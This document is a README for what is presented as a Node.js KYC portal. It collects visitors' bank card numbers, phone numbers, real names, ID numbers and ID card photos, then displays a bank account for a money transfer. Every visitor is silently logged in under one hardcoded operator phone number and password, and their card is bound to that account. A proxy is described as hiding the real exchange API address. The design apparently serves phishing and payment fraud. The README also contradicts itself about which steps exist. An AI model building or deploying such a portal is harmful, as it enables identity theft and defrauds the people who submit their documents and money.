# KYC Portal System

一个基于 Node.js 的 KYC（了解你的客户）门户系统，提供商户签约、实名认证和支付渠道管理功能。

## 功能特点

- ⚡ **无感知注册+登录** - 自动完成注册和登录流程
- 🎯 **极简操作** - 用户只需输入银行卡号即可
- 🔒 **安全的数据传输** - 使用固定的认证参数
- 📱 **响应式设计** - 完美支持移动端和桌面端
- 🎨 **现代化 UI** - 渐变色彩和流畅动画
- 🔗 **智能代理** - 自动处理注册和登录接口调用

## 完整工作流程

### 单页面Tab架构 (index.html)
系统采用单页面应用(SPA)设计，所有步骤在同一页面内通过Tab切换完成，无需页面跳转。

#### 步骤1: 商户签约
**用户输入:**
- 银行卡号 (自动识别18家主要银行)
- 银行绑定手机号

**后台处理:**
1. 调用交易所注册接口: `POST /?s=/ApiIndex/regsub`
   - 固定参数: tel=13116005610, pwd=a112233, invite=13116005610, code=""
   - 前端收集: bankCard (银行卡号), phone (银行绑定手机号)

2. 注册成功后立即调用登录接口: `POST /?s=/ApiIndex/loginsub`
   - 参数: tel=13116005610, pwd=a112233, code=""

3. 登录成功后后台异步调用绑卡接口: `POST /?s=/ApiMy/customer_bind`
   - 参数: session_id, bankname, banknumber, mobile, bankcode
   - 不阻塞用户流程，后台执行

**用户操作:** 点击"下一步" → 切换到步骤2 (实名认证Tab)

---

#### 步骤2: 实名认证
**页面状态:** 进度条显示步骤2为激活状态 (蓝色渐变高亮)

**用户输入:**
- 真实姓名
- 身份证号码 (18位，带校验码验证)
- 身份证正面照片
- 身份证反面照片

**后台处理:**
调用交易所实名认证接口: `POST /?s=/ApiMy/authuser`
- 参数:
  * `realname`: 真实姓名
  * `usercard`: 身份证号码
  * `front_image`: 身份证正面照片 (Base64编码)
  * `back_image`: 身份证反面照片 (Base64编码)
  * `type`: 认证类型 (1-个人认证)
- 验证身份证号格式和校验码
- 上传身份证照片为Base64编码
- 返回认证ID和审核状态

**用户操作:** 点击"提交认证" → 切换到步骤3 (汇款渠道Tab)

---

#### 步骤3: 汇款渠道
**页面状态:** 进度条显示步骤3为激活状态

**展示信息:**
- 收款账号: 20000095558470018283641
- 收款户名: 贵州云上大宗商品交易市场有限公司
- 收款银行: 北京银行深圳分行
- 入金时间: 周一至周五 9:00-17:30

**功能:**
- 一键复制账号、户名、银行信息
- 显示绑卡成功状态
- 温馨提示和注意事项

**用户操作:** 点击"已完成转账，进入系统" → 完成流程

---

### Tab切换逻辑
- **步骤切换:** 通过JavaScript动态显示/隐藏对应的步骤内容 (.step-content)
- **进度指示器:** 实时更新进度条状态 (active/completed/default)
- **数据持久化:** 使用sessionStorage保存用户输入，支持刷新页面恢复状态
- **平滑过渡:** 步骤切换时带淡入动画效果，提升用户体验

## 固定参数配置

系统使用以下固定参数（用户无需输入）：

- **手机号**: `13116005610`
- **密码**: `a112233`
- **邀请码**: 空（可选）
- **验证码**: 空（可选）
- 👤 用户注册和登录功能
- 💾 会话管理（SessionStorage）

## 项目结构

```
kyc_protal/
├── server.js              # Node.js 服务器（API代理）
├── package.json           # 项目配置和依赖
├── .env                   # 环境变量配置
├── public/                # 前端静态文件
│   ├── index.html        # 主页面（商户签约）
│   ├── css/
│   │   └── style.css     # 样式文件
│   └── js/
│       └── app.js        # 前端交互逻辑
├── backend/               # 预留后端目录
├── frontend/              # 预留前端目录
└── README.md             # 项目说明
```

## 快速开始

### 1. 安装依赖

```bash
npm install
```

### 2. 配置环境变量

编辑 `.env` 文件（如需修改端口或其他配置）：

```env
PORT=3000
NODE_ENV=development
```

### 3. 启动服务器

开发模式（自动重启）：
```bash
npm run dev
```

生产模式：
```bash
npm start
```

### 访问应用

打开浏览器访问：

- **注册页面:** `http://localhost:3000`
- **登录页面:** `http://localhost:3000/login.html`
- **用户中心:** `http://localhost:3000/dashboard.html`

## API 说明

### 无感知注册+登录接口

**端点:** `POST /api/register`

**请求体:**
```json
{
  "bankCard": "6222021234567890123"
}
```

**响应（成功）:**
```json
{
  "success": true,
  "message": "注册并登录成功",
  "isNewUser": true,
  "data": {
    "mid": 26119,
    "session_id": "6fa5369f83c623701b6d69d366d2f93d",
    "socket_token": "aDEFEhd6G1SArR6l",
    "bankCard": "6222021234567890123",
    "tel": "13116005610"
  }
}
```

**工作原理:**
1. 使用固定手机号和密码尝试注册
2. 如果用户已存在，自动跳过注册
3. 自动使用相同参数登录
4. 返回登录信息和令牌

### 登录接口

**端点:** `POST /api/login`

**请求体:**
```json
{
  "tel": "13116005610",
  "pwd": "a112233",
  "logintype": 1
}
```

**响应:**
```json
{
  "success": true,
  "data": {
    "status": 1,
    "msg": "登录成功",
    "mid": 26119,
    "session_id": "...",
    "socket_token": "..."
  },
  "message": "登录成功",
  "mid": 26119,
  "session_id": "...",
  "socket_token": "..."
}
```

### 健康检查

**端点:** `GET /api/health`

**响应:**
```json
{
  "status": "ok",
  "message": "KYC Portal API is running"
}
```

## 技术栈

### 后端
- Node.js
- Express.js
- Axios（HTTP 客户端）
- CORS（跨域处理）

### 前端
- 原生 HTML5
- CSS3（渐变、动画、Flexbox）
- 原生 JavaScript（ES6+）

## 功能说明

### 三步流程

1. **商户签约** - 收集银行卡号、手机号、密码、邀请码
2. **实名认证** - 身份验证（待开发）
3. **汇款渠道** - 设置支付通道（待开发）

### 表单验证

- 银行卡号：13-19位数字
- 手机号：11位手机号码
- 密码：6-20位字符
- 邀请码：必填项
- 短信验证码：4-6位数字（可选）

### 安全特性

- 前端表单验证
- 后端数据校验
- HTTPS 推荐
- 错误处理机制

## 开发说明

### 目录说明

- `server.js` - Express 服务器，提供 API 代理功能
- `public/` - 前端静态资源
  - `index.html` - 商户签约页面
  - `css/style.css` - 样式定义
  - `js/app.js` - 前端逻辑

### API 代理

本系统通过 Node.js 服务器代理请求到交易所 API：

```
前端 → Node.js (localhost:3000) → 交易所 API
```

这样做的好处：
- 隐藏真实 API 地址
- 统一处理 CORS 问题
- 可以添加日志和监控
- 方便进行请求/响应处理

## 配置说明

### 交易所 API 配置

在 `server.js` 中修改：

```javascript
const EXCHANGE_API = {
  baseUrl: 'https://qcmpce.gzcj-szh.com/',
  params: {
    aid: '5',
    platform: 'h5',
    session_id: '你的session_id',
    pid: '0',
    scene: '1001'
  }
};
```

## 注意事项

⚠️ **重要提示：**

1. 邀请码是必填项，否则会返回"必须有邀请人邀请注册"错误
2. 建议在生产环境使用 HTTPS
3. 请妥善保管 session_id 等敏感信息
4. 生产环境建议添加更多的安全验证

## 待开发功能

- [ ] 第二步：实名认证页面
- [ ] 第三步：汇款渠道设置
- [ ] 发送短信验证码功能
- [ ] 用户会话管理
- [ ] 数据持久化（数据库）
- [ ] 管理后台

## License

MIT

## 联系方式

如有问题请提交 Issue
